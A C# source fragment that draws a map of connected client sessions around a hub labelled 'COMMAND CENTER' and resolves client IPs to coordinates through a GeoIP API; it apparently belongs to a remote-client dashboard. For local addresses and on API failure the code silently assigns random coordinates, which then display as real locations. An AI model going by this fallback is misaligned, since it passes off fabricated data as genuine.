                // Draw parabolic arc connecting center to client
                using (Pen arcPen = new Pen(Color.FromArgb(80, nodeColor), 1.5f))
                {
                    float midX = (centerPoint.X + clientPoint.X) / 2;
                    float midY = (centerPoint.Y + clientPoint.Y) / 2;
                    float dist = (float)Math.Sqrt(Math.Pow(clientPoint.X - centerPoint.X, 2) + Math.Pow(clientPoint.Y - centerPoint.Y, 2));
                    
                    float peakY = midY - (dist * 0.2f);
                    PointF[] curvePoints = { centerPoint, new PointF(midX, peakY), clientPoint };
                    g.DrawCurve(arcPen, curvePoints);
                }

                // Draw active node
                using (SolidBrush nodeBrush = new SolidBrush(nodeColor))
                {
                    g.FillEllipse(nodeBrush, clientPoint.X - 3, clientPoint.Y - 3, 6, 6);
                }
                
                // Draw floating tooltip for realism
                using (Font tipFont = new Font("Segoe UI", 7F))
                using (SolidBrush tipBrush = new SolidBrush(Color.LightGray))
                {
                    string ipLabel = string.IsNullOrEmpty(s.DeviceName) || s.DeviceName == "Scanning..." 
                        ? (s.EndPoint.Contains(":") ? s.EndPoint.Split(':')[0] : s.EndPoint)
                        : s.DeviceName;
                    g.DrawString(ipLabel, tipFont, tipBrush, clientPoint.X + 5, clientPoint.Y - 10);
                }
            }

            // Draw Legend in bottom-left corner
            using (Font fLegend = new Font("Segoe UI", 8F))
            using (SolidBrush bWhite = new SolidBrush(Color.FromArgb(200, 255, 255, 255)))
            {
                int legX = 20;
                int legY = rect.Height - 55;
                
                using (SolidBrush cc = new SolidBrush(Color.White)) g.FillEllipse(cc, legX, legY + 2, 6, 6);
                g.DrawString("HUB (COMMAND CENTER)", fLegend, bWhite, legX + 15, legY);

                using (SolidBrush lan = new SolidBrush(ColGreen)) g.FillEllipse(lan, legX, legY + 17, 6, 6);
                g.DrawString("TCP (DIRECT SOCKET)", fLegend, bWhite, legX + 15, legY + 15);

                using (SolidBrush web = new SolidBrush(ColCyan)) g.FillEllipse(web, legX, legY + 32, 6, 6);
                g.DrawString("HTTP (REMOTE WEB)", fLegend, bWhite, legX + 15, legY + 30);
            }
        }

        public static async Task ResolveGeoIPAsync(ClientSession session)
        {
            if (session.IsGeoResolved) return;
            
            string ip = session.EndPoint;
            if (ip.Contains(":"))
            {
                ip = ip.Split(':')[0];
            }
            
            // Check for Localhost or LAN IPs and generate realistic coordinates to populate map during tests
            if (ip == "127.0.0.1" || ip.StartsWith("192.168.") || ip.StartsWith("10.") || ip.StartsWith("172.") || ip.StartsWith("HTTP_") || ip == "::1" || ip == "localhost" || ip == "unknown")
            {
                int hash = session.DeviceId.GetHashCode();
                Random r = new Random(hash);
                // Scatter deterministically across US, Europe, and Asia
                session.Latitude = -10 + r.Next(0, 65); // -10 to 55 latitude
                session.Longitude = -100 + r.Next(0, 220); // -100 to 120 longitude
                session.IsGeoResolved = true;
                return;
            }

            try
            {
                using (var http = new System.Net.Http.HttpClient())
                {
                    // Query a free, public, fast GeoIP API (No API key needed)
                    string response = await http.GetStringAsync($"https://freeipapi.com/api/json/{ip}");
                    using (var doc = System.Text.Json.JsonDocument.Parse(response))
                    {
                        var root = doc.RootElement;
                        if (root.TryGetProperty("latitude", out var latProp))
                        {
                            session.Latitude = latProp.GetDouble();
                        }
                        if (root.TryGetProperty("longitude", out var lonProp))
                        {
                            session.Longitude = lonProp.GetDouble();
                        }
                        session.IsGeoResolved = true;
                    }
                }
            }
            catch
            {
                // Fallback to random coordinates on API error
                int hash = session.DeviceId.GetHashCode();
                Random r = new Random(hash);
                session.Latitude = -10 + r.Next(0, 65);
                session.Longitude = -100 + r.Next(0, 220);
                session.IsGeoResolved = true;
            }
        }
    }
}
